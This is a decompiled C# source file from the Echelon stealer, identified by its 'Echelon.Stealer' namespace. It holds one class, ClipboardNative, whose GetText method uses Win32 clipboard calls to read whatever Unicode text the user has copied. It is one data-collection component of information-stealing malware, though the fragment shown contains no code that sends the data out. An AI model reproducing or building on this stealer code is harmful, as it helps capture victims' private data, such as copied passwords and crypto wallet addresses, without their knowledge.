using System;
using System.Runtime.InteropServices;
using Echelon.Global;

namespace Echelon.Stealer.SystemsData
{
	// Token: 0x02000020 RID: 32
	internal static class ClipboardNative
	{
		// Token: 0x06000058 RID: 88 RVA: 0x0000522C File Offset: 0x0000342C
		public static string GetText()
		{
			if (NativeMethods.IsClipboardFormatAvailable(13u) && NativeMethods.OpenClipboard(IntPtr.Zero))
			{
				string result = string.Empty;
				IntPtr clipboardData = NativeMethods.GetClipboardData(13u);
				if (!clipboardData.Equals(IntPtr.Zero))
				{
					IntPtr intPtr = NativeMethods.GlobalLock(clipboardData);
					if (!intPtr.Equals(IntPtr.Zero))
					{
						try
						{
							result = Marshal.PtrToStringUni(intPtr);
							NativeMethods.GlobalUnlock(intPtr);
						}
						catch
						{
						}
					}
				}
				NativeMethods.CloseClipboard();
				return result;
			}
			return null;
		}

		// Token: 0x0400003D RID: 61
		private const uint CF_UNICODETEXT = 13u;
	}
}
